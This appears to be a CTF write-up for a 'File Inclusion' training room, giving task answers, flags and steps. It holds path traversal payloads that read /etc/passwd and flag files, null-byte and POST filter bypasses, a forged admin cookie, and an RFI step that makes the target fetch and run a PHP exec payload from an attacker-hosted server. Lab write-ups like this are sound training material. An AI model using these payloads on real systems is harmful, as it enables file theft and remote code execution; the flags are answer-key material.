# File Inclusion

![banner](imgs/File%20Inclusion/roomBanner.png)

## Room objectives

- what is File Inclusion vulnerability?
- how it risky?
- what is path traversal vulnerability?

## Tasks

### Task 1 : Introduction

<details>
<summary>
Let's continue to the next section to deploy the attached VM.
</summary>

```
No answer needed 
```

</details>

---

### Task 2 : Deploy the VM

<details>
<summary>
Once you've deployed the VM, please wait a few minutes for the webserver to start, then progress to the next section!
</summary>

```
No answer needed 
```

</details>

---

### Task 3 : Path Traversal

<details>
<summary>
What function causes path traversal vulnerabilities in PHP?
</summary>

```
file_get_contents
```

</details>

---

### Task 4 : Local File Inclusion - LFI #1

<details>
<summary>
Give Lab #1 a try to read /etc/passwd. What would the request URI be?
</summary>

<br>

![T4_1](imgs/File%20Inclusion/T4_1.png)

```
/lab1.php?file=etc/passwd
```

</details>

<br>

<details>
<summary>
In Lab #2, what is the directory specified in the include function?
</summary>

<br>

![T4_2](imgs/File%20Inclusion/T4_2.png)

```
includes
```

</details>

---

### Task 5 : Local File Inclusion - LFI #2

<details>
<summary>
Give Lab #3 a try to read /etc/passwd. What is the request look like?
</summary>

<br>

![T5_1](imgs/File%20Inclusion/T5_1.png)

```
/lab3.php?file=../../../../etc/passwd%00
```

</details>

<br>

<details>
<summary>
Which function is causing the directory traversal in Lab #4?
</summary>

<br>

![T5_2](imgs/File%20Inclusion/T5_2.png)

```
file_get_contents
```

</details>

<br>

<details>
<summary>
Try out Lab #6 and check what is the directory that has to be in the input field?
</summary>

<br>

![T5_3](imgs/File%20Inclusion/T5_3.png)

```
THM-profile
```

</details>

<br>

<details>
<summary>
Try out Lab #6 and read /etc/os-release. What is the VERSION_ID value?
</summary>

<br>

![T5_4](imgs/File%20Inclusion/T5_4.png)

```
12.04
```

</details>

---

### Task 6 : Remote File Inclusion - RFI

<details>
<summary>
We showed how to include PHP pages via RFI. Do research on how to get remote command execution (RCE), and answer the question in the challenge section.
</summary>

```
No answer needed 
```

</details>

---

### Task 7 : Remediation

<details>
<summary>
Ready for the challenges?
</summary>

```
No answer needed 
```

</details>

---

### Task 8 : Challenge

<details>
<summary>
Capture Flag1 at /etc/flag1
</summary>

<br>

- first of all after test invalid input we get error massage

- challenge have hint to use POST request
![T8_1](imgs/File%20Inclusion/T8_1.png)
- after request the flag file using `../../../../etc/flag1`
![T8_1](imgs/File%20Inclusion/T8_1_2.png)
- and we got the 1st flag
![T8_1](imgs/File%20Inclusion/T8_1_2_3.png)

```
F1x3d-iNpu7-f0rrn
```

</details>

<br>

<details>
<summary>
Capture Flag2 at /etc/flag2
</summary>

<br>

- after access the challenge we found that we are not admin
- by using burp to intercept the request we can notice cookie called `THM` edit it to admin
![T8_2](imgs/File%20Inclusion/T8_2.png)
![T8_2](imgs/File%20Inclusion/T8_2_2.png)
- after that we write our payload `../../../../etc/flag2%00.php` and we got the 2nd flag
![T8_2](imgs/File%20Inclusion/T8_2_3.png)
![T8_2](imgs/File%20Inclusion/T8_2_4.png)

```
c00k13_i5_yuMmy1
```

</details>

<br>

<details>
<summary>
Capture Flag3 at /etc/flag3
</summary>

<br>

- after try to enter our payload we notice a filter
![T8_3](imgs/File%20Inclusion/T8_3_1.png)
- after all tries to bypass we can't get out of at so we changed the method to `POST`
![T8_3](imgs/File%20Inclusion/T8_3_2.png)
- and put the payload again `../../../../../etc/flag3%00`
![T8_3](imgs/File%20Inclusion/T8_3_3.png)
- we got the 3rd flag
![T8_3](imgs/File%20Inclusion/T8_3_4.png)

```
P0st_1s_w0rk1in9
```

</details>

<br>

<details>
<summary>
Gain RCE in Lab #Playground /playground.php with RFI to execute the hostname command. What is the output?
</summary>

<br>

- first of all let's prepare our payload

```php
<?php
print exec('hostname');
?>
```

![T8_4](imgs/File%20Inclusion/T8_4_1.png)

- we lunched our local server using python `python3 -m http.server`
![T8_4](imgs/File%20Inclusion/T8_4_2.png)
- get our local IP
![T8_4](imgs/File%20Inclusion/T8_4_3.png)
- use this to exploit RFI with our payload `http://10.10.54.5/playground.php?file=http://10.10.83.180:8000/host.txt`
![T8_4](imgs/File%20Inclusion/T8_4_4.png)

```
lfi-vm-thm-f8c5b1a78692 
```

</details>
